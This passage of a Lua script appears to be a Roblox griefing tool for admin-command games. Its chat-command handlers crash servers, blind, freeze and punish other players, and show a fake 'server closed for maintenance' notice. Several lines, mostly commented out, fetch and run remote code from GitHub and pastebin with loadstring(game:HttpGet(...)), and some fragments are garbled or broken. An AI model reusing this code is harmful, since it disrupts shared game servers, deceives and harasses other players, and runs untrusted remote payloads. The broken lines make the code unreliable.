                        cht("music 6823378863")
                        cht("//temploopgrab")
                        cht("/trap others");wait()
                        cht("stun others");wait(.5)
                        cht("noclip others")
                        cht(
                            [[h  

























_______________________________________


__________________________
__________________________

Scrambling the signals

__________________________

Please wait

_________________________________
__________________________

]]
                        );wait()
                        say("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻")
                        say("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻")
                        say("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻");wait(5)
                        cht("//untemploopgrab")
                        cht("clr");wait()
                        say("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻")
                        say("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻")
                        say("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻");wait(5)
                        say("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻")
                        say("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻")
                        say("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻");wait(5)
                        cht("refresh all");wait()
                        cht("/regpiss")
                    end
                    if msg:lower() == prefix .. "ap" then
                        -- loadstring(game:HttpGet(("https://pastebin.com/raw/7uPyt7VM"), true))()
                    end
                    if msg:lower() == prefix .. "bmove" then
                        print("Omg real working btools")
                                --//     Sussy Script     //--
                        logn("bmove Lite loaded")
                        if shared.__Dispose ~= nil then
                            shared.__Dispose()
                            shared.__Dispose = nil
                        end
                        local exit = false
                        local connections = {}
                        shared.__Dispose = function()
                            for i, c in ipairs(connections) do
                                c:Disconnect()
                            end
                            exit = true
                        end
                    
                    --//     Services     //--
                        local plyrs = game:GetService("Players")
                        local ws = game:GetService("Workspace")
                        local rns = game:GetService("RunService")
                    
                    --//     Tables     //--
                        local Nav = {
                            target,
                            held = false,
                            ut
                        }
                    
                    --//     Variables     //--
                        local lp = plyrs.LocalPlayer
                        local mouse = lp:GetMouse()
                    
                    --//     Functions     //--
                       --  local ivorysc = game:HttpGet("https://raw.githubusercontent.com/T3chn0w1thth4t/scripts-cheats-2/main/Protected%20(99).lua")
                        local IvoryMovePart = nil -- my fancy move library
                        --local function MovePart(t, p)
                        --t.CFrame = p
                          --   IvoryMovePart = loadstring(ivorysc, true)()
                            IvoryMovePart(t, p, true)
                            IvoryMovePart = nil
                            workspace.Gravity = 191
                        end
                        local function FloorVec(v)
                            return Vector3.new(math.floor(v.X), math.floor(v.Y), math.floor(v.Z))
                        end
                    
                    --//     Code     //--
                        table.insert(connections, mouse.Button1Down:Connect(function() -- get
                            if mouse.Target then
                                Nav.ut = mouse.Target
                                Nav.target = Nav.ut:Clone()
                                Nav.target.Parent = ws
                                Nav.target.CanCollide = false
                                Nav.target.Transparency = 0.6
                                mouse.TargetFilter = Nav.target
                                Nav.held = true
                            end
                        end))
                        table.insert(connections, rns.RenderStepped:Connect(function() -- client move
                            if Nav.held and Nav.target then
                                local pos = ws.Camera.CFrame.Position + (mouse.UnitRay.Direction * 30)
                                Nav.target.Position = FloorVec(pos)
                            end
                        end))
                        table.insert(connections, mouse.Button1Up:Connect(function() -- finish & mov
                            Nav.target:Destroy()
                            MovePart(Nav.ut, Nav.target.CFrame)
                            mouse.TargetFilter = nil
                            Nav.held = false
                            Nav.target = nil
                            Nav.ut = nil
                        end))
                        repeat
                            wait()
                        until exit
                        return
                    end
        

                            --wait(.5)
                            --loadstring(game:HttpGet(('https://raw.githubusercontent.com/T3chn0w1thth4t/scripts-cheats-2/main/Protected%20-%202022-04-06T212947.046.lua'),true))()
        
                            -- cmd/ID Hider 00000000000000000000000000000
                    if msg:lower() == prefix .. "fixbgrav" then
                        workspace.Gravity = 196.2
                    end
                    if msg:lower() == prefix .. "fixgrav" then
                        workspace.Gravity = 196.2
                    end
                    if msg:lower() == prefix .. "floppa" then
                        cht("reset me");
                        wait(.65)
                        cht("unshirt me")
                        cht("shirt me 9582295098");
                        wait(.65)
                        -- loadstring(game:HttpGet('https://pastebin.com/raw/KfrD2Rsr', true))()
                    end
                    if msg:lower() == prefix .. "bdel" then
                        wait(.65)
                        cht("/clicktpiss");
                        wait(.25)
                       -- loadstring(
                            --        game:HttpGet(
                              --          ("https://raw.githubusercontent.com/T3chn0w1thth4t/scripts-cheats-2/main/Protected%20-%202022-04-06T212947.046.lua"),
                              --          true
                              --      )
                             --   )() ;
                        wait(.35)
                        cht("nil")
                        execCmd("float")
                        execCmd("infjump")
                    end
                    if msg:lower() == prefix .. "brockenhammer" then
                        execCmd("partpath")
                        workspace.Gravity = 196.2 ;
                        wait(4.5)
                        -- loadstring(game:HttpGet(('https://raw.githubusercontent.com/SCchbVL5/scr4bl33/main/BrockenHammer'), true))()
                    end
                    if msg:lower() == prefix .. "kbmove" then
                        cht("//savebuildstuff");
                        wait(.65)
                        print("Omg real working btools")
                        cht("gear me 0000000000000000000000000018474459");
                        wait()
                        cht("gear me 0000000000000000000000000079446473");
                        wait(.65)
                        cht("//bdel")
                        cht("//brockenhammer")
                                --//     Sussy Script     //--
                        logn("Original bmove script Made by yeemi<3 \n Remade by Tech__")
                        if shared.__Dispose ~= nil then
                            shared.__Dispose()
                            shared.__Dispose = nil
                        end
                        local exit = false
                        local connections = {}
                        shared.__Dispose = function()
                            for i, c in ipairs(connections) do
                                c:Disconnect()
                            end
                            exit = true
                        end
                        -- local Tools = loadstring(game:HttpGet("https://pastebin.com/raw/Yk4rG8Mb", true))()
                        -- moveScript = game:HttpGet("https://pastebin.com/raw/vycCFpbn")
        
                                --//     Create tools     //--
                        Tools:MakeTool(
                                    "Move",
                                    function()
                          --   loadstring(moveScript)()
                        end,
                                    function()
                            shared.__Dispose()
                            for i, v in pairs(workspace:GetChildren()) do
                                if v.Name == "PhantomPart" then
                                    v:Destroy()
                                end
                            end
                            workspace.Gravity = 198.1
                        end)
                        repeat
                            wait()
                        until exit
                        return
                    end
        
                            --wait(.5)
                            --r(game:HttpGet(('https://raw.githubusercontent.com/T3chn0w1thth4t/scripts-cheats-2/main/Protected%20-%202022-04-06T212947.046.lua'),true))()
        
                            -- cmd/ID Hider 00000000000000000000000000000
                    if msg:lower() == prefix .. "disableperm" then
                      --  loadstring(
                              --      game:HttpGet(
                               --         ("https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats-2/main/Protected%20(16).lua"),
                               --         true
                             --       )
                            --    )()
                        print("s \n Perm has been disabled.")
                    end
                    if msg:lower() == prefix .. "antigearon" then
                        cht("/toggle anticrashvg on")
                        antigear = true
                        for i, v in pairs(game.Players:GetPlayers()) do
                            if #v.Backpack:GetChildren() > 0 then
                                cht("/sm pending request...");
                                wait(.5)
                                cht("ungear 00000000000000000000000000000 others")
                            end
                        end
                    end
                    if msg:lower() == prefix .. "antigearoff" then
                        cht("/toggle anticrashvg off")
                        antigear = false
                    end
                    if msg:lower() == prefix .. "idrj" then
                        cht(";prefix ;");
                        wait(1)
                        cht("//rj");
                        wait(1)
                        cht(";prefix /")
                    end
                    if msg:lower() == prefix .. "uncs" then
                        game.Players.LocalPlayer:kick("Unexpected Client Behavior")
                        wait(5.5)
                        game:shutdown()
                    end
                    if msg:lower() == prefix .. "movedb" then
                        game:GetService("Workspace").FallenPartsDestroyHeight = 0 / 0
                        print("Death barrier moved");
                        wait(.65)
                        logn("Done")
                    end
                    if msg:lower() == prefix .. "unmovedb" then
                        game:GetService("Workspace").FallenPartsDestroyHeight = -10001 ;
                        wait(.35)
                        logn("Unmoved")
                    end
                    if msg:lower() == prefix .. "mboombox" then
                        cht("//spam //mbxxmbxx");
                        wait(5.5)
                        cht("//stop")
                        cht("speed me 24")
                    end
                    if msg:lower() == prefix .. "prefix" then
                        cht("pm me Check your clipboard. And you have to be in the discordant server")
                        setclipboard(
                                    "https://discord.com/channels/918344197201866782/962379629115629579/962420469628280972"
                                )
                        cht("/stop")
                        cht("speed me 24")
                    end
                    if msg:lower() == prefix .. "god" then
                        cht("/toggle antikill")
                        logn("Disable antikill before you use this")
                        --loadstring(
                                --    game:HttpGet(
                                --        ("https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats-2/main/EFling%20SCV2%20press%20E.lua"),
                                 --     true
                                 --   )
                                --)()
                    end
                    if msg:lower() == prefix .. "fly" then
                        cht("noclip me")
                     --   loadstring(
                         --           game:HttpGet(
                            --            ("https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats-2/main/NA-fly-KAH.lua"),
                      --             true
                    --                )
                       --         )()
                    end
                    if msg:lower() == prefix .. "msgnoabuse" then
                        cht(
                                    "//setmsg abusing admin isn't tolerated in this server, doing so will result in a punishment."
                                )
                    end
                    if msg:lower() == prefix .. "msgtruth" then
                        cht(
                                    "//setmsg lf the fi rst cmd after getting admin is an ''others'' cmd you've officially proven yourself fatherless"
                                )
                        cht("m SPREAD THE WORD BUCKOS")
                    end
                    if msg:lower() == prefix .. "pin" then
                        say("The invite link is: .gg/65yHbG4Wfa")
                        cht("h \n \n \n Join VIA shortcut today for this script! \n \n \n ");
                        wait(5)
                        cht("h \n \n \n Join VIA shortcut today for this script! \n \n \n ");
                        wait(5)
                        cht("//tspam h \n \n \n Join VIA shortcut today for this script! \n \n \n ")
                    end
                    if msg:lower() == prefix .. "shutdown" then
                        antiTeleport = false
                        cht(
                            "h \n \n \n Server Message: The server has closed due to maintenance. Error Code 267 \n \n \n "
                        )
                        cht("blind all")
                        cht("/reg")
                        cht("blind all");wait(.35)
                        cht("gear me 000000000000000000000094794847")
                        cht("gear me 000000000000000000000094794847")
                        cht("gear me 000000000000000000000094794847")
                        cht("gear me 000000000000000000000094794847")
                        cht("gear me 000000000000000000000094794847")
                        cht("gear me 000000000000000000000094794847");wait(.35)
                        cht("skydive me me me me me me")
                        cht("gear me 000000000000000000000094794847")
                        cht("gear me 000000000000000000000094794847")
                        cht("skydive me me me me me me");wait(.35)
                        cht("/alltools")
                        cht("normal me me me")
                        cht("undog me");wait()
                        cht("normal me me me")
                        cht("undog me");wait()
                        cht("normal me me me")
                        cht("undog me");wait()
                        cht("normal me me me")
                        cht("undog me")
                        cht("normal me me me")
                        cht("/alltools")
                        cht("undog me")
                        cht("unsize me,me,me,me,me,me,me,me,me,me,me,me,m,e,me,me");wait(.5)
                        cht("//findresetpad");wait(2.2)
                        cht("//loopgrab");wait(.6)
                        cht("respawn all")
                        cht("size all 0.3")
                        cht("size all 0.3")
                        cht("size all 0.3")
                        cht("freeze all")
                        cht("size all 10")
                        cht("size all 10")
                        cht("size all 10")
                        cht("clone all")
                        cht("respawn all")
                       -- loadstring(
                           -- game:HttpGet(
                           --     "https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats-2/main/ForcecrashKohls.lua",
                          --      true
                          --  )
                      --  )()
                        cht("respawn all")
                       -- loadstring(
                        --    game:HttpGet(
                      --          "https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats-2/main/ForcecrashKohls.lua",
                             --   true
---)
--)()
                    end
                    if msg:lower() == prefix .. "tempcrash" then
                        cht("size all 0.3")
                        cht("size all 0.3")
                        cht("size all 0.3")
                        cht("freeze all")
                        cht("size all 10")
                        cht("size all 9.9")
                        cht("size all 9.9")
                        cht("clone all")
                        cht("size all 0.3")
                        cht("size all 0.3")
                        cht("size all 0.3")
                        cht("freeze all")
                        cht("size all 10")
                        cht("size all 9.9")
                        cht("size all 9.9")
                        cht("clone all");wait(.5)
                        cht("blind all");wait(4.5)
                        cht("blind all");wait()
                        cht("punish others");wait(10)
                        cht("blind all");wait(5)
                        cht("punish others");wait(10)
                        cht("blind all");wait(5)
                        cht("punish others");wait(10)
                        cht("blind all");wait(5)
                        cht("punish others");wait(5)
                    end
                    if msg:lower() == prefix .. "silcrash" then
                        cht("unchar random")
                        cht("size all 0.3")
                        cht("size all 0.3")
                        cht("size all 0.3")
                        cht("freeze all")
                        cht("size all 10")
                        cht("size all 9.9")
                        cht("size all 9.9")
                        cht("clone all")
                        cht("size all 0.3")
                        cht("size all 0.3")
                        cht("size all 0.3")
                        cht("freeze all")
                        cht("size all 10")
                        cht("size all 9.9")
                        cht("size all 9.9")
                        cht("clone all")
                        cht("size all 10")
                        cht("size all 9.9")
                        cht("size all 9.9")
                        cht("freeze all")
                        cht("size all 10")
                        cht("size all 9.9")
                        cht("size all 9.9")
                        cht("clone all")
                        cht("gear me 000000000000000000000000000000000000000000000000000000000094794847")
                        wait()
                        cht("gear me 000000000000000000000000000000000000000000000000000000000094794847")
                        --loadstring(
                        --    game:HttpGet(
                        --        ("https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats-2/main/ForcecrashKohls.lua"),
                        --        true
                        --    )
                        --)()
                        wait(.5)
                        cht("size all 0.3")
                        cht("size all 0.3")
                        cht("size all 0.3")
                        cht("freeze all")
                        cht("size all 10")
                        cht("size all 10")
                        cht("size all 10")
                        cht("clone all")
                        cht("size all 0.3")
                        cht("size all 0.3")
                        cht("size all 0.3")
                        cht("freeze all")
                        cht("size all 10")
                        cht("size all 10")
                        cht("size all 10")
                        cht("clone all")
                        cht("gear me 000000000000000000000000000000000000000000000000000000000094794847")
                        cht("blind all");wait(4.5)
                        cht("gear me 000000000000000000000000000000000000000000000000000000000094794847")
                        cht("blind all");wait()
                        cht("gear me 000000000000000000000000000000000000000000000000000000000094794847")
                        cht("punish others")
                        cht("h Crashed!!")
                     --[[  loadstring(
                            game:HttpGet(
                                ("https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats-2/main/ForcecrashKohls.lua"),
                                true
                            )
                        )() ;wait()
                        cht("gear me 000000000000000000000000000000000000000000000000000000000094794847")
                        cht("blind all");wait(5)
                        cht("punish others")
                        cht("h Crashed!!");wait()
                        cht("gear me 000000000000000000000000000000000000000000000000000000000094794847")
                        cht("blind all");wait(5)
                        cht("punish others")
                        cht("h Crashed!!");wait()
                        cht("blind all");wait(5)
                        cht("punish others")
                        cht("gear me 000000000000000000000000000000000000000000000000000000000094794847");wait(5)
                        loadstring(
                            game:HttpGet(
                                ("https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats-2/main/ForcecrashKohls.lua"),
                                true
                            )
                        )()
                        cht("gear all 94794847")
                         loadstring(
                            game:HttpGet(
                                ("https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats-2/main/ForcecrashKohls.lua"),
                                true
                            )
                        )()--]]
                    end

                    if msg:lower() == prefix .. "bypass" then
                        local h = Instance.new("Hint")
                        h.Parent = Workspace
                        h.Text = "Bypassing the fucking chat" ;wait(10)
                        h:Remove()
                       eeeeet("https://the-shed.dev/scripts/sbp.lua", falseing))()
                        logn("fuck yeah")
                        cht(
                            "pm me Alot of words ain't tagged if you type a . before then for example .hi .you .guys .f"
                        )
                    end
                    if msg:lower() == prefix .. "correctbp" then
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-69, 4, 14));wait(.65)
                        cht("/attach");wait(2.55)
                        cht("unskydive me");wait(.35)
                        cht("reset me")
                    end
                    if string.sub(msg:lower(), 0, 7) == prefix .. "fixbp" then
                        cht("/toggle antivoid")
                        cht("invis Baseplate me")
                        cht("setgrav me -235");wait(.65)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-31, 2006, 90));wait(.25)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-31, 4006, 90));wait(.25)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-31, 6006, 90));wait(.25)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-31, 8006, 90));wait(.25)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-31, 10006, 90));wait(.25)
                        cht("gear me 00000000000000000000000000000000108158379");wait()
                        local function L_1_func()
                            repeat wait()
                            until game.Players.LocalPlayer.Backpack:FindFirstChild("IvoryPeriastron")
                            game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.IvoryPeriastron)
                        end
                        local function L_2_func()
                            repeat wait()
                            until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
                            local L_10_=game:GetService("Workspace").Terrain["_Game"]local L_11_=L_10_.Workspace;local L_12_=L_10_.Admin;local L_13_=game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")local L_14_=true
                            spawn(function()
                                while true do
                                    game:GetService('RunService').Heartbeat:Wait()
                                    game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
                                    L_13_.CFrame = game:GetService("Workspace").Terrain._Game.Workspace.Baseplate.CFrame * CFrame.new(-1 * (game:GetService("Workspace").Terrain._Game.Workspace.Baseplate.Size.X / 2) - (game.Players.LocalPlayer.Character['Torso'].Size.X / 2), 0, 0);wait()
                                    if not L_14_ then
                                        break
                                    end
                                end
                            end)
                            spawn(function()
                                while L_14_ do
                                    game:GetService('RunService').Heartbeat:Wait()
                                    cht("unpunish me "..math.random(1,1000))
                                end
                            end);wait(0.3)
                            L_14_ = false
                        end
                        local L_3_ = math.random(1, 2)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-501, 0.100000001, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1));wait(.25)
                        cht("setgrav me -550");wait()
                        cht("gear me 00000000000000000000000000000108158379")
                        L_1_func();wait(.35)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
                        local L_4_ = {
                            [1] = Enum.KeyCode.E
                        }
                    
                        game:GetService("Players").LocalPlayer.Character.IvoryPeriastron.Remote:FireServer(unpack(L_4_));wait()
                        repeat wait()
                        until game:GetService("Workspace").Camera:FindFirstChild("FakeCharacter");wait()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
                        cht("unfly me");wait(.2)
                        repeat
                            L_2_func()
                    
                        until game.Players.LocalPlayer.Character.Torso:FindFirstChild("Weld");wait()
                    
                        local L_5_ = {
                            [1] = Enum.KeyCode.E
                        }
                    
                        game:GetService("Players").LocalPlayer.Character.IvoryPeriastron.Remote:FireServer(unpack(L_5_))
                        repeat wait()
                        until not game:GetService("Workspace").Camera:FindFirstChild("FakeCharacter")
                    
                        game.Players.LocalPlayer.Character:Destroy()
                        cht("/toggle antivoid")
                        L_1_func();wait(.35)
                        local L_6_ = {
                            [1] = Enum.KeyCode.E
                        }
                    
                        game:GetService("Players").LocalPlayer.Character.IvoryPeriastron.Remote:FireServer(unpack(L_6_))
                        repeat wait()
                        until game:GetService("Workspace").Camera:FindFirstChild("FakeCharacter");wait()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1, -498, 1))
                        for L_15_forvar0, L_16_forvar1 in pairs(game:GetService("Workspace").Camera:GetChildren()) do
                            if L_16_forvar1.Name == "FakeCharacter" then
                                L_16_forvar1:Destroy()
                            end
                        end
                        local L_7_ = game:GetService("Workspace").Terrain["_Game"]
                        local L_8_ = L_7_.Workspace
                        local L_9_ = L_7_.Admin
                    end
                    --game.Players.LocalPlayer.Character:Destroy()
                    if string.sub(msg:lower(), 0, 9) == prefix .. "breakbp" then
                        cht("gear me 00000000000000000000000000000000108158379");wait()
                        local function L_1_func()
                            repeat wait()
                            until game.Players.LocalPlayer.Backpack:FindFirstChild("IvoryPeriastron")
                            game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.IvoryPeriastron)
                        end
                        local function L_2_func()
                            repeat wait()
                            until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
                            local L_10_=game:GetService("Workspace").Terrain["_Game"]local L_11_=L_10_.Workspace;local L_12_=L_10_.Admin;local L_13_=game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")local L_14_=true
                            spawn(function()
                                while true do
                                    game:GetService('RunService').Heartbeat:Wait()
                                    game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
